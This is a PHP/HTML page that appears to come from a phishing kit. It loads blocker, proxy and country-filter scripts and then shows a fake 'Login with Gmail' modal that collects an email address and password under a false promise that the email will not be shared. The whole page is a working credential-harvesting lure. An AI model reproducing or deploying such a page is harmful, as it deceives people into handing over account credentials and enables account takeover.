<?php error_reporting(0);
require_once 'blocker.php';
require_once 'proxy.php';
require_once 'Country.php';
?><!doctype html>
<html lang="en">
<head>
<?php require_once('File/Vendor/header.php'); ?>

<!--><!--><!--><!-->

<div class="modal fade" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">&times;
</span>
</button>
</div>
<div class="modal-body">
<center>
<img id="fieldImg" src="File/gmail.png" class="img-fluid rounded-circle" width="80px">
<h5 class="modal-title" id="exampleModalLabel">Login with 
<span id="field">Gmail
</span>
</h5>
<div class="alert alert-danger" id="msg">
</div>
</center>
<form id="contact" class="form-horizontal well">
<div class="col-lg-12">
<div class="form-group">
<label for="exampleInputEmail1">Email address
</label>
<input type="email" name="email"  required="required" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Enter email">
<small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.
</small>
</div>
</div>
<div class="col-lg-12">
<div class="form-group">
<label for="Password">Password
</label>
<input type="password" name="password"  required="required" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password">
</div>
</div>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close
</button>
<button class="btn btn-lg btn-info pull-right" id="submit-btn">Login
</button>
</div>
</form>

<!--><!-->

<?php require_once('File/Vendor/footer.php'); ?>
</html>